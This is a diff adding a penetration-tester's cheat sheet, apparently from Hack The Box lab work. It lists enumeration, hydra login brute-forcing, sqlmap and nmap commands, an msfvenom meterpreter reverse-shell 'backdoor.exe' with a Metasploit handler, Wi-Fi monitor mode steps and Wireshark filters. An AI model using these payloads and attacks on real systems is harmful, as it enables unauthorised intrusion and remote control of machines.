@@ -1,0 +1,154 @@
+Update everything:
+sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get full-upgrade -y
+===========================================================================================================================
+#Gobuster:
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.43 -o gobuster/http-dlist-lower-small.tx
+
+#Wfuzz:
+wfuzz -u http://10.10.10.167/admin.php -H FUZZ:FUZ2Z -w /home/kali/htb/control/headers -W /home/kali/htb/control/ip -p 127.0.0.1:8080:HTTP
+===========================================================================================================================
+Setting up Metasploit:
+systemctl start postgresql
+msfdb init
+db_status
+===========================================================================================================================
+Listener:
+nc -lvnp 9001
+===============
+Python server for when you want to transfer a file
+sudo python3 -m http.server 80
+===========================================================================================================================
+Nmap:
+nmap -sC -sV -oA nmap/initial 10.10.10.84
+
+    -sC specifies default scripts
+    -sV probes each port for services
+    -oA outputs to all major file types
+    nmap/initial specifies the directory in which to output the scan
+===========================================================================================================================	
+Hydra:
+hydra -l admin -P /home/kali/htb/nineveh/10k 10.10.10.43 http-post-form "/department/login.php:username=^user^&password=^PASS^:Invalid" -t 64
+===========================================================================================================================
+SQLmap:
+sqlmap -r search.req --batch --force-ssl
+sqlmap -r login.req --batch --force-ssl
+	-'search.req = info from search bar results using BurpSuite Repeater using 'Copy to File'
+	-'login.req = info from login screen using results from BurpSuite Repeater using 'Copy to File'
+===========================================================================================================================	
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.239 -f exe -o payload.exe
+===========================================================================================================================	
+How to set a WiFi adapter in Monitor Mode:
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+or
+
+airmon-ng check kill
+airmon-ng start wlan0
+===========================================================================================================================
+How to install dpkg:
+dpkg -i ~/Downloads/file.deb
+===========================================================================================================================
+Starting a handler with Metasploit:
+You can start a handler with Metasploit at any time, this is useful when you are executing a backdoor
+in a victim’s machine and you need to connect back to take control. Now we’ll show you the steps you 
+need to start your handler at the same port of your backdoor. 
+
+#msfconsole
+msf> use multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST <Listening_IP> (Your IP)
+msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4444)
+msf exploit(handler) > exploit
+[*] Started reverse handler on 192.168.75.35:4444
+[*] Starting the payload handler…
+===========================================================================================================================
+Creating an executable backdoor with Metasploit:
+# msfpayload windows/meterpreter/reverse_tcp lhost=<Listening_IP> lport=<Listening_Port> x > backdoor.exe
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.239 -f exe -o payload.exe
+
+LHOST= Your IP
+RHOST= Target IP
+
+The backdoor.exe file is saved in the path where you executed the command.
+===========================================================================================================================
+
+Wireshark Filters:
+
+
+Filtering traffic from one server:
+
+ip.addr eq <IP>
+
+Filtering traffic between two servers:
+
+ip.addr eq <IP1> and ip.addr eq <IP2>
+
+Filtering traffic of standard protocols:
+
+smtp
+
+ldap
+
+ssl
+
+http
+
+dns
+
+Filtering an SMTP conversation between two servers:
+
+ip.addr eq <IP1> and ip.addr eq <IP2> and smtp
+
+Filtering an HTTP conversation between two servers:
+
+ip.addr eq <IP1> and ip.addr eq <IP2> and http
+
+Filtering an SMTP Conversation with TLS between two servers:
+
+ip.addr eq <IP1> and ip.addr eq <IP2> and ssl
+
+Filtering outgoing packets from ona particular IP:
+
+ip.src eq <IP>
+
+Filtering incoming packets from one particular IP:
+
+ip.dst eq <IP>
+
+Filtering the number of SMTP sessions:
+
+smtp.req.command eq QUIT
+
+Filtering the number of transmited mails:
+
+smtp.req.command eq MAIL
+
+Filtering the number of recipients in an SMTP conversation:
+
+smtp.req.command eq RCPT
+
+Filtering a specific recipient mailbox:
+
+smtp.req.command eq RCPT and smtp.req.parameter contains “user@domain.com”
+
+Filtering a specific sender mailbox:
+
+smtp.req.command eq MAIL and smtp.req.parameter conatains “user@domain.com”
+
+Filtering SMTP errors:
+
+If you know the error code then use this filter:
+
+smtp.response.code eq <ERROR_CODE>
+
+for example: smtp.response.code eq 421
+
+If you don’t know it, or if you want to list all SMTP errors in the SMTP sessions, then you must first exclude all the valid codes (2XX) until you end up only with 4XX or 5XX codes.
+
+not smtp.response.code eq 220 and not smtp.response.code eq 221 and not smtp.response.code eq 250 and not smtp.response.code eq 354 and smtp.response.code
+
+When you execute this filter you will end up only with 4XX and/or 5XX error codes so you will see all SMTP errors withing your capture. If it ends up blank, it means that no SMTP errors were found in that specific capture.
+
+===========================================================================================================================
